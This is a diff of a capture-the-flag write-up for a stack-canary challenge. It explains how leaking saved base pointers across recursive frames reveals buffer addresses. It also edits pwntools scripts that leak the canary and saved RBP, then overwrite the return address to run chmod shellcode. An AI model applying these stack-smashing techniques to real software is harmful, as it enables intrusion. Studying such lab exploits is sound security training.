@@ -11257,10 +11257,48 @@ The buffer address for the `n+1`th frame is `0x7fff591b05b0`.
 - [ ] Last 4 nibbles of the `n+1`th buffer
 - [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
 
+###  Base Pointer shenanigans
+
+Given what we know about the stack, we know that the right between the canary and the stored return address, is stored base pointer for the caller function.
+So, when we are in the first invocation of `challenge()`, the stored base pointer has the value of the pointer of `main()`.
+
+Similarly, when we send `REPEAT*` in payload, and the `challenge()` invokes itself again, the stored base pointer of the second invocation points to the stored base pointer of the first invocation of `challenge()`.
+
 ```
-rip: 0x7fff0fa20648
-buf: 0x7fff0fa205d0
+<==: Value stored at address
+<--: Points to address
+
+   Address (Hex)           Memory Content                    Description
+                    ┌───────────────────────────┐
+     0x...e4a0      │  [   Shellcode Area    ]  │ <── rsp    Buffer   # 3rd call to challenge()
+         ...        │  .. .. .. .. .. .. .. ..  │
+     0x...e510      │  [    Canary (n=3)     ]  │
+     0x...e518      │  0x...e5d8 (rbp_2)     │  │ <── rbp    Stored RBP (points to n=2)
+     0x...e520      │  [ Return to Frame 2   ]  │            Return Address
+  ────────────────  ├───────────────────────────┤
+     0x...e568      │  .. .. .. .. .. .. .. ..  │ <── rsp    Buffer  # 2nd call to challenge()
+         ...        │  .. .. .. .. .. .. .. ..  │
+     0x...e5d0      │  [    Canary (n=2)     ]  │
+     0x...e5d8      │  0x...e698 (rbp_1)     │  │ <── rbp    Stored RBP (points to n=1)
+     0x...e5e0      │  [ Return to Frame 1   ]  │            Return Address
+  ────────────────  ├───────────────────────────┤
+     0x...e628      │  .. .. .. .. .. .. .. ..  │ <── rsp    Buffer  # 1st call to challenge()
+         ...        │  .. .. .. .. .. .. .. ..  │
+     0x...e690      │  [    Canary (n=1)     ]  │
+     0x...e698      │  0x...e758 (rbp_m)     │  │ <── rbp    Stored RBP (points to main)
+     0x...e6a0      │  [ Return to main()    ]  │            Return Address
+  ────────────────  ├───────────────────────────┤
+     0x...e758      │  [  main's stored RBP  ]  │ <── rbp    Main's Stack Frame
+     0x...e760      │  [ Return to __libc    ]  │
+                    └───────────────────────────┘
 ```
+
+When we leak out the canary in the first stage of the payload, we also leak out the store base pointer. However, this is the stored. base pointer of `main()` as we just discussed, and is of no use to us.
+But, if we repeat the first stage of the payload, in the second invocation of `challenge()`, we will be able to leak out the base pointer of the first invocation. 
+
+Since, we know the distance between the buffer and the stored base pointer, we can calculate the address of the first invocation's buffer.
+From there, as we know the offset between the buffers of the `n`th and `n+1`th invocation of `challenge()`, we can calculate the buffer address of the 2nd invocation, and most importantly, calculate the buffer address of the 3rd (next) invocation in which we will pass teh shellcode to the chal;enge.
+
 
 ### Exploit
 
@@ -11309,207 +11347,6 @@ canary = u64(canary_raw.rjust(8, b'\x00'))
 print(f"Canary : {hex(canary)}")
 
 
-# # --- STAGE 2: FINAL PAYLOAD ---
-# # Shellcode
-# shellcode_asm = """
-#    /* chmod("z", 0004) */
-#    push 0x5a
-#    push rsp
-#    pop rdi
-#    pop rax
-#    mov sil, 0x4
-#    syscall
-# """
-# shellcode_address = actual_buffer_addr_during_stage_1 - offset_buffers_diff_challenge_frames
-# shellcode = asm(shellcode_asm)
-# print(f"Shellcode length: {len(shellcode)}")
-
-# # Calculate offset_to_ret and payload_size
-# offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
-# payload_size = offset_to_canary + 8 + offset_to_ret + 8
-
-# # Send payload size
-# p.sendline(str(payload_size).encode())
-
-# # Craft payload
-# payload = shellcode
-# payload += b"A" * (offset_to_canary - len(shellcode))
-# payload += p64(canary)
-# payload += b"B" * offset_to_ret
-# payload += p64(shellcode_address)
-
-# # Send payload
-# p.recvuntil(b"bytes)!")
-# p.send(payload)
-
-p.interactive()
-```
-
-
-
-```py
-from pwn import *
-
-context.arch = "amd64"
-context.os = "linux"
-context.log_level = "error"
-
-p = process("/challenge/canary-conundrum-hard")
-
-# Initialize values
-buffer_addr = 0x7fffedf75bd0
-canary_addr = 0x7fffedf75c38
-addr_of_saved_ip = 0x7fff0fa20648
-nth_buffer_addr = 0x7fff591b0670
-n_plus_1th_buffer_addr = 0x7fff591b05b0
-offset_buffers_diff_challenge_frames = nth_buffer_addr - n_plus_1th_buffer_addr        # 192 bytes
-
-# --- STAGE 1: LEAK CANARY ---
-# Calculate offset_to_canary and payload_size
-offset_to_canary = canary_addr - buffer_addr
-payload_size = offset_to_canary + 1
-
-# Send payload_size
-p.recvuntil(b"Payload size: ")
-p.sendline(str(payload_size).encode())
-
-# Craft payload
-payload = b"REPEAT"
-payload += b"A" * (offset_to_canary - 6)
-payload += b"B"
-
-# Send payload
-p.recvuntil(b"bytes)!")
-p.send(payload)
-
-# Extract canary
-output = p.recvuntil(b'AAAAAB')
-output_str = output.decode()
-
-canary_raw = p.recv(7)
-canary = u64(canary_raw.rjust(8, b'\x00'))
-
-print(f"Canary : {hex(canary)}")
-
-
-# --- STAGE 2: LEAK SAVED RBP ---
-# Calculate offset_to_canary and payload_size
-offset_to_rbp = 8
-payload_size = offset_to_canary + 8 + offset_to_rbp
-
-# Send payload_size
-p.recvuntil(b"Payload size: ")
-p.sendline(str(payload_size).encode())
-
-# Craft payload
-payload = b"REPEAT"
-payload += b"A" * (offset_to_canary - 6)
-payload += b"B"
-
-# Send payload
-p.recvuntil(b"bytes)!")
-p.send(payload)
-
-output = p.recvuntil(b'AAAAAB')
-output_str = output.decode()
-
-# Extract canary (7 bytes because the null byte was overwritten)
-canary_raw = p.recv(7)
-canary = u64(canary_raw.rjust(8, b'\x00'))
-
-# Extract the Saved RBP (usually 6 bytes are non-zero in a 0x7ff... address)
-# We can read 6 bytes and pad it to 8.
-stored_rbp_raw = p.recv(6)
-stored_rbp = u64(stored_rbp_raw.ljust(8, b'\x00'))
-
-
-
-print(f"Canary     : {hex(canary)}")
-print(f"Stored RBP : {hex(stored_rbp)}")
-
-
-
-# # --- STAGE 2: FINAL PAYLOAD ---
-# # Shellcode
-# shellcode_asm = """
-#    /* chmod("z", 0004) */
-#    push 0x5a
-#    push rsp
-#    pop rdi
-#    pop rax
-#    mov sil, 0x4
-#    syscall
-# """
-# shellcode_address = actual_buffer_addr_during_stage_1 - offset_buffers_diff_challenge_frames
-# shellcode = asm(shellcode_asm)
-# print(f"Shellcode length: {len(shellcode)}")
-
-# # Calculate offset_to_ret and payload_size
-# offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
-# payload_size = offset_to_canary + 8 + offset_to_ret + 8
-
-# # Send payload size
-# p.sendline(str(payload_size).encode())
-
-# # Craft payload
-# payload = shellcode
-# payload += b"A" * (offset_to_canary - len(shellcode))
-# payload += p64(canary)
-# payload += b"B" * offset_to_ret
-# payload += p64(shellcode_address)
-
-# # Send payload
-# p.recvuntil(b"bytes)!")
-# p.send(payload)
-
-p.interactive()
-```
-
-```py title="~/script.py" showLineNumbers
-from pwn import *
-
-context.arch = "amd64"
-context.os = "linux"
-context.log_level = "error"
-
-p = process("/challenge/canary-conundrum-hard")
-
-# Initialize values
-buffer_addr = 0x7fffedf75bd0
-canary_addr = 0x7fffedf75c38
-addr_of_saved_ip = 0x7fff0fa20648
-nth_buffer_addr = 0x7fff591b0670
-n_plus_1th_buffer_addr = 0x7fff591b05b0
-offset_buffers_diff_challenge_frames = nth_buffer_addr - n_plus_1th_buffer_addr        # 192 bytes
-
-# --- STAGE 1: LEAK CANARY ---
-# Calculate offset_to_canary and payload_size
-offset_to_canary = canary_addr - buffer_addr
-payload_size = offset_to_canary + 1
-
-# Send payload_size
-p.recvuntil(b"Payload size: ")
-p.sendline(str(payload_size).encode())
-
-# Craft payload
-payload = b"REPEAT"
-payload += b"A" * (offset_to_canary - 6)
-payload += b"B"
-
-# Send payload
-p.recvuntil(b"bytes)!")
-p.send(payload)
-
-# Extract canary
-output = p.recvuntil(b'AAAAAB')
-output_str = output.decode()
-
-canary_raw = p.recv(7)
-canary = u64(canary_raw.rjust(8, b'\x00'))
-
-print(f"Canary : {hex(canary)}")
-
-
 # --- STAGE 2: LEAK SAVED RBP ---
 # Calculate offset_to_canary and payload_size
 offset_to_rbp = 8
@@ -11544,7 +11381,7 @@ print(f"Canary     : {hex(canary)}")
 print(f"Stored RBP : {hex(stored_rbp)}")
 
 
-# --- STAGE 2: FINAL PAYLOAD ---
+# --- STAGE 3: FINAL PAYLOAD ---
 # Shellcode
 shellcode_asm = """
    /* chmod("z", 0004) */
@@ -11555,7 +11392,7 @@ shellcode_asm = """
    mov sil, 0x4
    syscall
 """
-shellcode_address = stored_rbp - 8 - offset_to_canary - offset_buffers_diff_challenge_frames - offset_buffers_diff_challenge_frames
+shellcode_address = stored_rbp - 8 - offset_to_canary - (2 * offset_buffers_diff_challenge_frames)
 shellcode = asm(shellcode_asm)
 print(f"Shellcode length: {len(shellcode)}")
 
